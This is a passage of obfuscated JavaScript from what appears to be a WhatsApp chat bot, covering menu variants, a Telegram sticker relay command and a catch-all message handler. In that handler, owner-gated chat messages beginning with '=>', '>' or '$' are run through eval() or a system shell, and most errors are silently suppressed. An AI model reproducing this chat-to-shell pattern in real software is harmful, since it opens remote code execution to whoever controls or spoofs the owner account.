              'video': fs.readFileSync('./XeonMedia/thumb2.mp4'),
              'gifPlayback': true,
              'caption': _0x39525e,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://imgur.com/a/AApdZU4.jpeg",
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5cfbb1
            });
          } else {
            if (typemenu === 'v3') {
              _0x2126c8.sendMessage(_0x5cfbb1.chat, {
                'video': fs.readFileSync("./XeonMedia/thumb2.mp4"),
                'caption': _0x39525e,
                'gifPlayback': true
              }, {
                'quoted': _0x5cfbb1
              });
            } else if (typemenu === 'v4') {
              _0x2126c8.relayMessage(_0x5cfbb1.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': _0x39525e
                }
              }, {});
            }
          }
        }
        break;
      case "telestick":
        {
          if (_0x4f8c4e[0x0] && _0x4f8c4e[0x0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
            let _0x20c254 = await _0x360874(_0x4f8c4e[0x0]);
            await _0x36440f("Sending " + _0x20c254.length + " stickers...");
            if (_0x5cfbb1.isGroup && _0x20c254.length > 0x1e) {
              await _0x36440f("Number of stickers more than 30, bot will send it in private chat.");
              for (let _0x507756 = 0x0; _0x507756 < _0x20c254.length; _0x507756++) {
                _0x2126c8.sendMessage(_0x5cfbb1.sender, {
                  'sticker': {
                    'url': _0x20c254[_0x507756].url
                  }
                });
              }
            } else {
              for (let _0x451772 = 0x0; _0x451772 < _0x20c254.length; _0x451772++) {
                _0x2126c8.sendMessage(_0x5cfbb1.chat, {
                  'sticker': {
                    'url': _0x20c254[_0x451772].url
                  }
                });
              }
            }
          } else {
            _0x36440f("Where is the telegram sticker link?\nExample. " + (_0x2507cf + _0x5ebe26) + " https://t.me/addstickers/FriendlyDeath");
          }
        }
        break;
      default:
        if (_0x5328f2.startsWith('=>')) {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          try {
            _0x36440f(util.format(eval("(async () => { return " + _0x5328f2.slice(0x3) + " })()")));
          } catch (_0x1e6bac) {
            _0x36440f(String(_0x1e6bac));
          }
        }
        if (_0x5328f2.startsWith('>')) {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          try {
            let _0x50e12e = await eval(_0x5328f2.slice(0x2));
            if (typeof _0x50e12e !== 'string') {
              _0x50e12e = require('util').inspect(_0x50e12e);
            }
            await _0x36440f(_0x50e12e);
          } catch (_0x20a86a) {
            await _0x36440f(String(_0x20a86a));
          }
        }
        if (_0x5328f2.startsWith('$')) {
          if (!_0x4fbeb2) {
            return _0x36440f(mess.owner);
          }
          exec(_0x5328f2.slice(0x2), (_0x266b8d, _0x27652f) => {
            if (_0x266b8d) {
              return _0x36440f(_0x266b8d);
            }
            if (_0x27652f) {
              return _0x36440f(_0x27652f);
            }
          });
        }
    }
  } catch (_0x1606c1) {
    console.log(util.format(_0x1606c1));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
process.on("uncaughtException", function (_0x42df15) {
  let _0x4a6136 = String(_0x42df15);
  if (_0x4a6136.includes('conflict')) {
    return;
  }
  if (_0x4a6136.includes("Socket connection timeout")) {
    return;
  }
  if (_0x4a6136.includes("not-authorized")) {
    return;
  }
  if (_0x4a6136.includes("already-exists")) {
    return;
  }
  if (_0x4a6136.includes("rate-overlimit")) {
    return;
  }
  if (_0x4a6136.includes("Connection Closed")) {
    return;
  }
  if (_0x4a6136.includes("Timed Out")) {
    return;
  }
  if (_0x4a6136.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", _0x42df15);
});